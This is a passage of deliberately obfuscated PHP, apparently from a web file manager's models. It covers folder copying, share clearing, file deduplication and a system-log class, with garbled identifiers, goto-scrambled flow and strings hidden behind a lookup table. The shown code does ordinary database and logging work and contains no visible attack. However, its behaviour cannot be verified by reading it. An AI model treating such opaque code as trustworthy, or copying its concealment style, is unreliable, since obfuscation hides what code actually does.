"\162\145\x70\154\141\143\x65\x28\160\x61\x72\145\x6e\x74\114\145\x76\x65\x6c\x2c\47{$A‚×ÊÚÑ}\47\54\47{$cƒ”äßëë½}\x27\x29"), $eæ¢Ì›ÌîŠ[562] => $a­øï®´[$eæ¢Ì›ÌîŠ[404]], $eæ¢Ì›ÌîŠ[563] => $a­øï®´[$eæ¢Ì›ÌîŠ[484]]); if ($BÀø¾¡œ•) { $d„¿ãŞ‡–©[$eæ¢Ì›ÌîŠ[422]] = 0; } $this->where($AÙ©ìÆËËŒ)->data($d„¿ãŞ‡–©)->save(); } $this->where(array($eæ¢Ì›ÌîŠ[410] => $bäÁÕ¤Ü…))->data($E §µ™Å°)->save(); return $bäÁÕ¤Ü…; goto D˜‰ïÏ”İ; d®Şõ´Á·É: if (!$aÛÖƒòÄ’“ && $this->moveClearAuth) { Model($eæ¢Ì›ÌîŠ[482])->authClear($bäÁÕ¤Ü…); } $BÀø¾¡œ• = $d•õÌÄæÓù[$eæ¢Ì›ÌîŠ[423]] == $eæ¢Ì›ÌîŠ[87] && $a­øï®´[$eæ¢Ì›ÌîŠ[423]] != $eæ¢Ì›ÌîŠ[87]; if ($BÀø¾¡œ•) { $E §µ™Å°[$eæ¢Ì›ÌîŠ[422]] = 0; } goto b´ê³È¹´µ; eÈ²À‚”¡Ú: $EĞãÜìèœ = $d•õÌÄæÓù[$eæ¢Ì›ÌîŠ[403]] == $eæ¢Ì›ÌîŠ[87]; $E §µ™Å° = array($eæ¢Ì›ÌîŠ[394] => $a­øï®´[$eæ¢Ì›ÌîŠ[395]], $eæ¢Ì›ÌîŠ[566] => $a­øï®´[$eæ¢Ì›ÌîŠ[502]] . $a­øï®´[$eæ¢Ì›ÌîŠ[395]] . $eæ¢Ì›ÌîŠ[47], $eæ¢Ì›ÌîŠ[562] => $a­øï®´[$eæ¢Ì›ÌîŠ[404]], $eæ¢Ì›ÌîŠ[563] => $a­øï®´[$eæ¢Ì›ÌîŠ[484]], $eæ¢Ì›ÌîŠ[565] => USER_ID, $eæ¢Ì›ÌîŠ[413] => $ašºç¹½³Ö); $aÛÖƒòÄ’“ = $d•õÌÄæÓù[$eæ¢Ì›ÌîŠ[404]] == SourceModel::TYPE_GROUP && $a­øï®´[$eæ¢Ì›ÌîŠ[404]] == SourceModel::TYPE_GROUP && $d•õÌÄæÓù[$eæ¢Ì›ÌîŠ[484]] == $a­øï®´[$eæ¢Ì›ÌîŠ[484]]; goto d®Şõ´Á·É; Fà¹…ôŒœ»: $eæ¢Ì›ÌîŠ =& $_SERVER[æ§›¦ÌáØ]; $d•õÌÄæÓù = $this->sourceInfo($bäÁÕ¤Ü…); $a­øï®´ = $this->sourceInfo($EºŒ÷); goto eÈ²À‚”¡Ú; D˜‰ïÏ”İ: } private function clearShare($dğí”—‰À©, $b¦’Ù¾ğ½Ù) { goto B™´Â¹·¬Ç; D•Ã‚‹õ¿Ÿ: if (!$eİ¶¥³¶Á ) { return; } $eİ¶¥³¶Á  = array_to_keyvalue($eİ¶¥³¶Á , $eŞÉò‡Ö’[33], $eŞÉò‡Ö’[468]); $eâ§®¥•Åƒ = array($eŞÉò‡Ö’[468] => array($eŞÉò‡Ö’[7], $eİ¶¥³¶Á )); goto f·°òÍ„ÜŠ; B™´Â¹·¬Ç: $eŞÉò‡Ö’ =& $_SERVER[æ§›¦ÌáØ]; $F¾…µª¢ˆŞ = $this->sourceInfo($dğí”—‰À©); $c‡®›ãìĞ = $this->sourceInfo($b¦’Ù¾ğ½Ù); goto d¯¯¶ÜÒİ‚; d¯¯¶ÜÒİ‚: if ($F¾…µª¢ˆŞ[$eŞÉò‡Ö’[484]] == $c‡®›ãìĞ[$eŞÉò‡Ö’[484]] && $F¾…µª¢ˆŞ[$eŞÉò‡Ö’[404]] == $eŞÉò‡Ö’[575]) { return; } $eâ§®¥•Åƒ = array($eŞÉò‡Ö’[502] => array($eŞÉò‡Ö’[525], $F¾…µª¢ˆŞ[$eŞÉò‡Ö’[502]] . $dğí”—‰À© . $eŞÉò‡Ö’[526])); $fÉƒôÎö = $this->field($eŞÉò‡Ö’[410])->where($eâ§®¥•Åƒ)->getField($eŞÉò‡Ö’[395], !0); goto e†÷ˆä¡“; f·°òÍ„ÜŠ: Model($eŞÉò‡Ö’[576])->where($eâ§®¥•Åƒ)->save(array($eŞÉò‡Ö’[475] => 0)); Model($eŞÉò‡Ö’[577])->where($eâ§®¥•Åƒ)->delete(); goto f­¨»—º¯ç; e†÷ˆä¡“: if (!$fÉƒôÎö) { return; } $eâ§®¥•Åƒ = array($eŞÉò‡Ö’[395] => array($eŞÉò‡Ö’[7], $fÉƒôÎö), $eŞÉò‡Ö’[475] => 1); $eİ¶¥³¶Á  = Model($eŞÉò‡Ö’[576])->field($eŞÉò‡Ö’[468])->where($eâ§®¥•Åƒ)->select(); goto D•Ã‚‹õ¿Ÿ; f­¨»—º¯ç: } public function copyFolderFromIO($E‡ÖĞ¼ÕÇá, $B’Ì‘†íÌ, $a‹°’–Ú¶ , $b‡•¨î¯²ç, $c¤¿Œ„¹˜¢, $Eâ‚ªÑŠ‘Û = false) { goto CÈ¶í¿Åù­; a”Ù”—ŠöÅ: if ($C®ƒÇÃÎğÖ) { $this->_childrenAllMake($C®ƒÇÃÎğÖ); } Hook::trigger($DŞ’”¨¸æ[579]); $this->_copyChildTo($E‡ÖĞ¼ÕÇá, $B’Ì‘†íÌ, $cÃÊë™ÁÊ‚, $b‡•¨î¯²ç, $b–‡Ä¡¤¶¨, $c¤¿Œ„¹˜¢); goto Aæ»·¥ç–§; bóºğøê¼: $this->updateModifyTime($a‹°’–Ú¶ ); return $cÃÊë™ÁÊ‚; goto AœÑ»ŞÁ·°; déäŒğ¨‰æ: Model($DŞ’”¨¸æ[450])->linkAdd($b–‡Ä¡¤¶¨[$DŞ’”¨¸æ[542]]); Model($DŞ’”¨¸æ[450])->remove($b–‡Ä¡¤¶¨[$DŞ’”¨¸æ[578]]); $this->folderSizeReset($a‹°’–Ú¶ ); goto bóºğøê¼; C‘÷‰ö: Model($DŞ’”¨¸æ[545])->addAll($b–‡Ä¡¤¶¨[$DŞ’”¨¸æ[543]], array(), !0); Model($DŞ’”¨¸æ[546])->eventCopy($cÃÊë™ÁÊ‚); $this->saveAll($b–‡Ä¡¤¶¨[$DŞ’”¨¸æ[544]]); goto déäŒğ¨‰æ; CÈ¶í¿Åù­: $DŞ’”¨¸æ =& $_SERVER[æ§›¦ÌáØ]; $b–‡Ä¡¤¶¨ = array($DŞ’”¨¸æ[543] => array(), $DŞ’”¨¸æ[544] => array(), $DŞ’”¨¸æ[542] => array(), $DŞ’”¨¸æ[578] => array()); $F‡ ãòÉŒ = $Eâ‚ªÑŠ‘Û ? $Eâ‚ªÑŠ‘Û : $E‡ÖĞ¼ÕÇá->pathThis($B’Ì‘†íÌ); goto AÁ…°Åê; AÁ…°Åê: $C®ƒÇÃÎğÖ = $this->fileNameExist($a‹°’–Ú¶ , $F‡ ãòÉŒ); $cÃÊë™ÁÊ‚ = $this->mkdir($a‹°’–Ú¶ , $F‡ ãòÉŒ, $b‡•¨î¯²ç); if (!$C®ƒÇÃÎğÖ || $b‡•¨î¯²ç == REPEAT_RENAME_FOLDER) { $b‡•¨î¯²ç = !1; } goto a”Ù”—ŠöÅ; Aæ»·¥ç–§: Hook::trigger($DŞ’”¨¸æ[580]); if ($cÃÊë™ÁÊ‚) { $this->folderSizeResetChildren($cÃÊë™ÁÊ‚); } $this->_childrenListClear(); goto C‘÷‰ö; AœÑ»ŞÁ·°: } private function _copyChildTo($Eàµ˜Ù†®¦, $D’šÆçÈğÀ, $dä÷Â‚ö¹ô, $c»…½ˆ†î, &$D»ßé“İ±, $BõãÈ¨à”) { goto aê´–¡½÷ø; eØÊ´äÃÕ: if (!empty($eíùã«Ğ±‰)) { $this->addAll($eíùã«Ğ±‰); $this->_childrenListSelect($dä÷Â‚ö¹ô); } $E¡ßÏ°¾…¸ = $this->_childrenList($dä÷Â‚ö¹ô); $E¡ßÏ°¾…¸ = array_to_keyvalue($E¡ßÏ°¾…¸, $CÌ¡µ·…•Ç[28]); goto e¥æì¥çÑ; e¹†ó‚¢Ÿ—: $eíùã«Ğ±‰ = array(); foreach ($cé½Ä¿Ó¾° as &$fŸÌ¥§‘–°) { goto b„çÁ»¨½†; d¯…×¶‚¸: if ($c»…½ˆ†î) { $c®«ªìöŠŠ = $this->fileNameExistCache($dä÷Â‚ö¹ô, $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[28]]); if ($c®«ªìöŠŠ) { if ($fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[403]] || $c»…½ˆ†î == REPEAT_SKIP) { continue; } if ($c»…½ˆ†î == REPEAT_REPLACE) { $Eà¨ñ¬áƒè = $this->sourceInfoCache($c®«ªìöŠŠ); $EŠÇÚ‚â¾ = $this->fileHistory($Eà¨ñ¬áƒè, $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[447]], $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[78]]); if ($EŠÇÚ‚â¾) { $D»ßé“İ±[$CÌ¡µ·…•Ç[542]][] = $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[447]]; } continue; } else { if ($c»…½ˆ†î == REPEAT_RENAME) { $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[28]] = $this->fileNameAutoCache($dä÷Â‚ö¹ô, $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[28]], $c»…½ˆ†î, !1); } } } } if (!$fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[403]] && $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[447]]) { $D»ßé“İ±[$CÌ¡µ·…•Ç[542]][] = $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[447]]; } $eíùã«Ğ±‰[] = $this->_makeItemData($fŸÌ¥§‘–°, $AßÍöäÔí‹, $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[28]]); goto e¬ÈÁİÏİÂ; c°í±‰¨ˆ¿: $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[78]] = _get($fŸÌ¥§‘–°, $CÌ¡µ·…•Ç[78], 0); $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[447]] = _get($fŸÌ¥§‘–°, $CÌ¡µ·…•Ç[447], 0); if (!isset($fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[581]]) && $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[447]]) { $D»ßé“İ±[$CÌ¡µ·…•Ç[578]][] = $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[447]]; } goto d¯…×¶‚¸; b„çÁ»¨½†: if (isset($e˜åõ”°æˆ[$fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[28]]])) { $fŸÌ¥§‘–° = $e˜åõ”°æˆ[$fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[28]]]; } $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[403]] = $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[29]] == $CÌ¡µ·…•Ç[77]; $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[405]] = _get($fŸÌ¥§‘–°, $CÌ¡µ·…•Ç[168], $CÌ¡µ·…•Ç[33]); goto c°í±‰¨ˆ¿; e¬ÈÁİÏİÂ: } unset($fŸÌ¥§‘–°); goto eØÊ´äÃÕ; aê´–¡½÷ø: $CÌ¡µ·…•Ç =& $_SERVER[æ§›¦ÌáØ]; $AßÍöäÔí‹ = $this->sourceInfoCache($dä÷Â‚ö¹ô); $C˜ËÖ’¥ùŸ = $Eàµ˜Ù†®¦->listPath($D’šÆçÈğÀ); goto e†³“Ñ™‘; e†³“Ñ™‘: $C˜ËÖ’¥ùŸ = $C˜ËÖ’¥ùŸ ? $C˜ËÖ’¥ùŸ : array($CÌ¡µ·…•Ç[74] => array(), $CÌ¡µ·…•Ç[75] => array()); $cé½Ä¿Ó¾° = array_merge($C˜ËÖ’¥ùŸ[$CÌ¡µ·…•Ç[74]], $C˜ËÖ’¥ùŸ[$CÌ¡µ·…•Ç[75]]); $e˜åõ”°æˆ = $this->_addFiles($Eàµ˜Ù†®¦, $C˜ËÖ’¥ùŸ[$CÌ¡µ·…•Ç[74]], $BõãÈ¨à”); goto e¹†ó‚¢Ÿ—; e¥æì¥çÑ: foreach ($cé½Ä¿Ó¾° as $fŸÌ¥§‘–°) { $Eà¨ñ¬áƒè = $E¡ßÏ°¾…¸[$fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[28]]]; $E”¢²›Ùï– = $Eà¨ñ¬áƒè[$CÌ¡µ·…•Ç[395]]; $this->_copyApplyMeta($Eà¨ñ¬áƒè, $D»ßé“İ±); if ($fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[29]] == $CÌ¡µ·…•Ç[77]) { $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[76]] = $Eàµ˜Ù†®¦->getPathInner($fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[76]]); $this->_copyChildTo($Eàµ˜Ù†®¦, $fŸÌ¥§‘–°[$CÌ¡µ·…•Ç[76]], $E”¢²›Ùï–, $c»…½ˆ†î, $D»ßé“İ±, $BõãÈ¨à”); } } goto d­ƒ‚êä§­; d­ƒ‚êä§­: } private function _addFiles($c¡Ô×á‹ŸÂ, $b¸‡•‹óô, $FÂŠ²Íš›–) { goto a²ĞÎ¯ŸÄ×; BØÍ›Ïñ¢: foreach ($b¸‡•‹óô as $DĞìÙ»Ö„¨) { $A‹õ½ªÇÎ[$DĞìÙ»Ö„¨[$d²‹ÁÑÚ©ò[28]]] = $DĞìÙ»Ö„¨; } return $A‹õ½ªÇÎ; goto cÙ öî†©; c“–¾ƒ¥™: $dğÈÕêÈ = $dğÈÕêÈ ? $dğÈÕêÈ : array(); foreach ($dğÈÕêÈ as $A²á¼ÄÇ¢Ï) { if (!isset($d©ŒÂ¥‡[$A²á¼ÄÇ¢Ï[$d²‹ÁÑÚ©ò[170]]])) { continue; } $B‘ä•ç½…– =& $d©ŒÂ¥‡[$A²á¼ÄÇ¢Ï[$d²‹ÁÑÚ©ò[170]]]; foreach ($B‘ä•ç½…– as &$aòšùèçÏ­) { $aòšùèçÏ­[$d²‹ÁÑÚ©ò[447]] = $A²á¼ÄÇ¢Ï[$d²‹ÁÑÚ©ò[447]]; } unset($aòšùèçÏ­); } $A‹õ½ªÇÎ = array(); goto BØÍ›Ïñ¢; FŠé¤ñÜÃò: foreach ($dğÈÕêÈ as $A²á¼ÄÇ¢Ï) { if (!isset($d©ŒÂ¥‡[$A²á¼ÄÇ¢Ï[$d²‹ÁÑÚ©ò[170]]])) { continue; } $bø¥’Ÿ‰‘‚ = $d©ŒÂ¥‡[$A²á¼ÄÇ¢Ï[$d²‹ÁÑÚ©ò[170]]]; foreach ($bø¥’Ÿ‰‘‚ as &$aòšùèçÏ­) { $aòšùèçÏ­[$d²‹ÁÑÚ©ò[447]] = $A²á¼ÄÇ¢Ï[$d²‹ÁÑÚ©ò[447]]; $aòšùèçÏ­[$d²‹ÁÑÚ©ò[581]] = !0; } unset($aòšùèçÏ­); } $eİ·µƒ½¢† = array(); foreach ($b¸‡•‹óô as $bÖºùÎˆ£) { if (isset($bÖºùÎˆ£[$d²‹ÁÑÚ©ò[581]]) && $bÖºùÎˆ£[$d²‹ÁÑÚ©ò[581]]) { continue; } $AŸš—Â½ÂŒ = $c¡Ô×á‹ŸÂ->getPathInner($bÖºùÎˆ£[$d²‹ÁÑÚ©ò[76]]); $Aø™ÅßÏæ– = $dÆ•ŸÀš‘¸->addFileMake($AŸš—Â½ÂŒ, $bÖºùÎˆ£[$d²‹ÁÑÚ©ò[78]], $bÖºùÎˆ£[$d²‹ÁÑÚ©ò[171]], $bÖºùÎˆ£[$d²‹ÁÑÚ©ò[170]], $bÖºùÎˆ£[$d²‹ÁÑÚ©ò[28]], $FÂŠ²Íš›–); $eİ·µƒ½¢†[] = $Aø™ÅßÏæ–; } goto F±™‚ÊöæÚ; eêìÃåÇôÕ: $dÆ•ŸÀš‘¸ = Model($d²‹ÁÑÚ©ò[584]); $dğÈÕêÈ = $dÆ•ŸÀš‘¸->where($Eê¨‚¼ùˆŒ)->select(); $dğÈÕêÈ = $dğÈÕêÈ ? $dğÈÕêÈ : array(); goto FŠé¤ñÜÃò; DÉÚÛ—¤ã: foreach ($b¸‡•‹óô as &$aòšùèçÏ­) { goto e³·öø«§é; d––ÍÑÜ: $B®„õêµŞÓ = $c¡Ô×á‹ŸÂ->hashMd5($aòšùèçÏ­[$d²‹ÁÑÚ©ò[76]]); if (strlen($B®„õêµŞÓ) > 10 && !isset($d©ŒÂ¥‡[$B®„õêµŞÓ])) { $d©ŒÂ¥‡[$B®„õêµŞÓ] = array(); } $aòšùèçÏ­[$d²‹ÁÑÚ©ò[171]] = $aÈÌÊêÎ‰¸; goto EïÍàêŞƒ¦; e³·öø«§é: Hook::trigger($d²‹ÁÑÚ©ò[582], $aòšùèçÏ­); $aòšùèçÏ­[$d²‹ÁÑÚ©ò[76]] = $c¡Ô×á‹ŸÂ->getPathInner($aòšùèçÏ­[$d²‹ÁÑÚ©ò[76]]); $aÈÌÊêÎ‰¸ = $c¡Ô×á‹ŸÂ->hashSimple($aòšùèçÏ­[$d²‹ÁÑÚ©ò[76]]); goto d––ÍÑÜ; EïÍàêŞƒ¦: $aòšùèçÏ­[$d²‹ÁÑÚ©ò[170]] = $B®„õêµŞÓ; Hook::trigger($d²‹ÁÑÚ©ò[583], $aòšùèçÏ­); $d©ŒÂ¥‡[$B®„õêµŞÓ][] =& $aòšùèçÏ­; goto aÕ×‹ë‹¸¹; aÕ×‹ë‹¸¹: if (count($d©ŒÂ¥‡[$B®„õêµŞÓ]) > 1) { $aòšùèçÏ­[$d²‹ÁÑÚ©ò[581]] = !0; } goto dÙğ¤¹Î•‰; dÙğ¤¹Î•‰: } unset($aòšùèçÏ­); $Eê¨‚¼ùˆŒ = array($d²‹ÁÑÚ©ò[170] => array($d²‹ÁÑÚ©ò[7], array_keys($d©ŒÂ¥‡))); goto eêìÃåÇôÕ; F±™‚ÊöæÚ: $dÆ•ŸÀš‘¸->addAll($eİ·µƒ½¢†); $Eê¨‚¼ùˆŒ = array($d²‹ÁÑÚ©ò[170] => array($d²‹ÁÑÚ©ò[7], array_keys($d©ŒÂ¥‡))); $dğÈÕêÈ = $dÆ•ŸÀš‘¸->where($Eê¨‚¼ùˆŒ)->select(); goto c“–¾ƒ¥™; a²ĞÎ¯ŸÄ×: $d²‹ÁÑÚ©ò =& $_SERVER[æ§›¦ÌáØ]; if (!$b¸‡•‹óô || count($b¸‡•‹óô) == 0) { return array(); } $d©ŒÂ¥‡ = array(); goto DÉÚÛ—¤ã; cÙ öî†©: } } define($_SERVER[æ§›¦ÌáØ][585], $_SERVER[æ§›¦ÌáØ][586]); goto AŒñİ¯”ÙÃ; cÉÕÔ¤»àÜ: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\x65\x6d\x5f\154\157\x67"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\x54\151\x6d\145", "\164\151\x6d\145", "\x69\x6e\x73\145\x72\164", "\146\x75\x6e\x63\164\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $F¾ÏÊÔÉ…ä =& $_SERVER[æ§›¦ÌáØ]; return array($F¾ÏÊÔÉ…ä[2000] => LNG($F¾ÏÊÔÉ…ä[2001]), $F¾ÏÊÔÉ…ä[2002] => LNG($F¾ÏÊÔÉ…ä[2003]), $F¾ÏÊÔÉ…ä[1629] => LNG($F¾ÏÊÔÉ…ä[2004]), $F¾ÏÊÔÉ…ä[2005] => LNG($F¾ÏÊÔÉ…ä[2006]), $F¾ÏÊÔÉ…ä[2007] => LNG($F¾ÏÊÔÉ…ä[2008]), $F¾ÏÊÔÉ…ä[2009] => LNG($F¾ÏÊÔÉ…ä[2010]), $F¾ÏÊÔÉ…ä[2011] => LNG($F¾ÏÊÔÉ…ä[2012]), $F¾ÏÊÔÉ…ä[1659] => LNG($F¾ÏÊÔÉ…ä[2012]), $F¾ÏÊÔÉ…ä[1660] => LNG($F¾ÏÊÔÉ…ä[2013]), $F¾ÏÊÔÉ…ä[2014] => LNG($F¾ÏÊÔÉ…ä[2015]), $F¾ÏÊÔÉ…ä[2016] => LNG($F¾ÏÊÔÉ…ä[2017]), $F¾ÏÊÔÉ…ä[2018] => LNG($F¾ÏÊÔÉ…ä[2019]), $F¾ÏÊÔÉ…ä[2020] => LNG($F¾ÏÊÔÉ…ä[2021]), $F¾ÏÊÔÉ…ä[1657] => LNG($F¾ÏÊÔÉ…ä[2022]), $F¾ÏÊÔÉ…ä[2023] => LNG($F¾ÏÊÔÉ…ä[2024]), $F¾ÏÊÔÉ…ä[1664] => LNG($F¾ÏÊÔÉ…ä[2025]), $F¾ÏÊÔÉ…ä[2026] => LNG($F¾ÏÊÔÉ…ä[2027]), $F¾ÏÊÔÉ…ä[2028] => LNG($F¾ÏÊÔÉ…ä[2029]), $F¾ÏÊÔÉ…ä[2030] => LNG($F¾ÏÊÔÉ…ä[2031]), $F¾ÏÊÔÉ…ä[2032] => LNG($F¾ÏÊÔÉ…ä[2033]), $F¾ÏÊÔÉ…ä[1667] => LNG($F¾ÏÊÔÉ…ä[2034]), $F¾ÏÊÔÉ…ä[1668] => LNG($F¾ÏÊÔÉ…ä[2035]), $F¾ÏÊÔÉ…ä[2036] => LNG($F¾ÏÊÔÉ…ä[2037]), $F¾ÏÊÔÉ…ä[2038] => LNG($F¾ÏÊÔÉ…ä[2039]), $F¾ÏÊÔÉ…ä[2040] => LNG($F¾ÏÊÔÉ…ä[2041]), $F¾ÏÊÔÉ…ä[1662] => LNG($F¾ÏÊÔÉ…ä[2042]), $F¾ÏÊÔÉ…ä[2043] => LNG($F¾ÏÊÔÉ…ä[2044]), $F¾ÏÊÔÉ…ä[1661] => LNG($F¾ÏÊÔÉ…ä[2045]), $F¾ÏÊÔÉ…ä[2046] => LNG($F¾ÏÊÔÉ…ä[2047]), $F¾ÏÊÔÉ…ä[2048] => LNG($F¾ÏÊÔÉ…ä[2049]), $F¾ÏÊÔÉ…ä[2050] => LNG($F¾ÏÊÔÉ…ä[2051]), $F¾ÏÊÔÉ…ä[2052] => LNG($F¾ÏÊÔÉ…ä[2052]), $F¾ÏÊÔÉ…ä[2053] => LNG($F¾ÏÊÔÉ…ä[1633]), $F¾ÏÊÔÉ…ä[2054] => LNG($F¾ÏÊÔÉ…ä[2055]), $F¾ÏÊÔÉ…ä[2056] => LNG($F¾ÏÊÔÉ…ä[2057]), $F¾ÏÊÔÉ…ä[2058] => LNG($F¾ÏÊÔÉ…ä[2059]), $F¾ÏÊÔÉ…ä[2060] => LNG($F¾ÏÊÔÉ…ä[2061]), $F¾ÏÊÔÉ…ä[2062] => LNG($F¾ÏÊÔÉ…ä[2063]), $F¾ÏÊÔÉ…ä[2064] => LNG($F¾ÏÊÔÉ…ä[2064]), $F¾ÏÊÔÉ…ä[2065] => LNG($F¾ÏÊÔÉ…ä[2066]), $F¾ÏÊÔÉ…ä[2067] => LNG($F¾ÏÊÔÉ…ä[2068]), $F¾ÏÊÔÉ…ä[2069] => LNG($F¾ÏÊÔÉ…ä[2070]), $F¾ÏÊÔÉ…ä[2071] => LNG($F¾ÏÊÔÉ…ä[2072]), $F¾ÏÊÔÉ…ä[2073] => LNG($F¾ÏÊÔÉ…ä[2074]), $F¾ÏÊÔÉ…ä[2075] => LNG($F¾ÏÊÔÉ…ä[2076])); } private function typeFile() { $DÉŠ±ÎÂñ­ =& $_SERVER[æ§›¦ÌáØ]; $EÖ°¡•‡ˆÍ = array($DÉŠ±ÎÂñ­[1664] => array($DÉŠ±ÎÂñ­[1665]), $DÉŠ±ÎÂñ­[2018] => array($DÉŠ±ÎÂñ­[2077]), $DÉŠ±ÎÂñ­[2020] => array($DÉŠ±ÎÂñ­[2078]), $DÉŠ±ÎÂñ­[1657] => array($DÉŠ±ÎÂñ­[1658]), $DÉŠ±ÎÂñ­[2028] => array(), $DÉŠ±ÎÂñ­[2030] => array(), $DÉŠ±ÎÂñ­[2032] => array(), $DÉŠ±ÎÂñ­[1667] => array($DÉŠ±ÎÂñ­[1669]), $DÉŠ±ÎÂñ­[1668] => array($DÉŠ±ÎÂñ­[1669]), $DÉŠ±ÎÂñ­[2036] => array($DÉŠ±ÎÂñ­[2079]), $DÉŠ±ÎÂñ­[2038] => array($DÉŠ±ÎÂñ­[2079]), $DÉŠ±ÎÂñ­[2040] => array($DÉŠ±ÎÂñ­[2080]), $DÉŠ±ÎÂñ­[2026] => array($DÉŠ±ÎÂñ­[2081]), $DÉŠ±ÎÂñ­[1662] => array($DÉŠ±ÎÂñ­[2082]), $DÉŠ±ÎÂñ­[2043] => array($DÉŠ±ÎÂñ­[2083]), $DÉŠ±ÎÂñ­[1661] => array($DÉŠ±ÎÂñ­[1663])); return $EÖ°¡•‡ˆÍ; } private function typeAll() { goto cã¤ã¦²ƒÛ; dâÑŠÆ‘¹ô: foreach ($D¤ÛÙ¤íá‡ as $CƒÎ¯£åï => $dšƒŠÕó¨î) { $dáßºÚ‰Š[$dšƒŠÕó¨î[0]] = $dáßºÚ‰Š[$CƒÎ¯£åï]; } $dáßºÚ‰Š[$A»§Å¿Ã—[1669]] = LNG($A»§Å¿Ã—[2084]); $dáßºÚ‰Š[$A»§Å¿Ã—[2079]] = LNG($A»§Å¿Ã—[2085]); goto FŠ²ø«Â÷Ä; cã¤ã¦²ƒÛ: $A»§Å¿Ã— =& $_SERVER[æ§›¦ÌáØ]; $dáßºÚ‰Š = $this->typeList; $D¤ÛÙ¤íá‡ = array_filter($this->typeFile()); goto dâÑŠÆ‘¹ô; FŠ²ø«Â÷Ä: return $dáßºÚ‰Š; goto Fï­“”¨; Fï­“”¨: } public function addLog($dßö‡Áƒ‚ì, $FÅ™‘éÜ• = array()) { goto E¿¼¾Šª³”; bËâè‚ÃĞÆ: if (!$fèÎƒ§¿¸) { $fèÎƒ§¿¸ = (int) Session::get($b˜”ÁË×[1815]); } $AìÌà¡ = get_client_ip(); if (!$FÅ™‘éÜ• || strlen(json_encode($FÅ™‘éÜ•)) >= 1024) { $FÅ™‘éÜ• = array($b˜”ÁË×[2086] => $AìÌà¡); } else { if (is_array($FÅ™‘éÜ•)) { $FÅ™‘éÜ•[$b˜”ÁË×[2086]] = $AìÌà¡; } else { $FÅ™‘éÜ• = array($b˜”ÁË×[1078] => $FÅ™‘éÜ•, $b˜”ÁË×[2086] => $AìÌà¡); } } goto bâ×‰¸·‰Ù; bâ×‰¸·‰Ù: $FÅ™‘éÜ• = array($b˜”ÁË×[1510] => Session::sign(), $b˜”ÁË×[1511] => $fèÎƒ§¿¸, $b˜”ÁË×[29] => $dßö‡Áƒ‚ì, $b˜”ÁË×[1513] => json_encode($FÅ™‘éÜ•)); parent::add($FÅ™‘éÜ•); goto e°¬É±°É; E¿¼¾Šª³”: $b˜”ÁË× =& $_SERVER[æ§›¦ÌáØ]; if (!isset($this->typeList[$dßö‡Áƒ‚ì])) { return; } $fèÎƒ§¿¸ = defined($b˜”ÁË×[454]) && USER_ID ? USER_ID : (isset($FÅ™‘éÜ•[$b˜”ÁË×[1520]]) ? $FÅ™‘éÜ•[$b˜”ÁË×[1520]] : 0); goto bËâè‚ÃĞÆ; e°¬É±°É: } public function remove($Böã‡©¡®ö) { $this->where(array($_SERVER[æ§›¦ÌáØ][412] => $Böã‡©¡®ö))->delete(); } private function _makeOrder($dˆ±ìÓÃ = '') { goto bìÌŠâ—Á; eç²­¦Ğß³: $eËã¶²”à = Input::get($f‹Ã…ÍÒ¶[436], $f‹Ã…ÍÒ¶[7], $f‹Ã…ÍÒ¶[1847], array($f‹Ã…ÍÒ¶[1771], $f‹Ã…ÍÒ¶[430])); $eËã¶²”à = $BÈÉİ éŸ§[$eËã¶²”à]; $dˆ±ìÓÃ = $dˆ±ìÓÃ . "{$e¥‹ñ½Ê˜Ğ}\40{$eËã¶²”à}"; goto FµªŒ·ğ’; bìÌŠâ—Á: $f‹Ã…ÍÒ¶ =& $_SERVER[æ§›¦ÌáØ]; $e¥‹ñ½Ê˜Ğ = $f‹Ã…ÍÒ¶[194]; $BÈÉİ éŸ§ = array($f‹Ã…ÍÒ¶[428] => $f‹Ã…ÍÒ¶[429], $f‹Ã…ÍÒ¶[430] => $f‹Ã…ÍÒ¶[431]); goto eç²­¦Ğß³; FµªŒ·ğ’: return $this->order($dˆ±ìÓÃ); goto eæŸÇ¾çã¢; eæŸÇ¾çã¢: } public function get($BËä´¾¦¬ò = '') { goto B¯©«åá˜; BŞÛ¶ô‚êÛ: if (!empty($BËä´¾¦¬ò[$dºØºô¸×ô[2086]])) { $fŸî˜æ¡[$dºØºô¸×ô[431]] = array($dºØºô¸×ô[380], "\x25{$BËä´¾¦¬ò[$dºØºô¸×ô[2086]]}\45"); } $D÷âÑ«—° = $this->_makeOrder()->where($fŸî˜æ¡)->selectPage(); if (empty($D÷âÑ«—°[$dºØºô¸×ô[367]])) { show_json(array(), !0, $D÷âÑ«—°[$dºØºô¸×ô[364]]); } goto Eõ‚’ŒÛ‡; B¯©«åá˜: $dºØºô¸×ô =& $_SERVER[æ§›¦ÌáØ]; if (!$BËä´¾¦¬ò) { show_json(array()); } $fŸî˜æ¡ = array(); goto D¨åâË“æ; D¨åâË“æ: if ($BËä´¾¦¬ò[$dºØºô¸×ô[1520]]) { $fŸî˜æ¡[$dºØºô¸×ô[1520]] = $BËä´¾¦¬ò[$dºØºô¸×ô[1520]]; } if 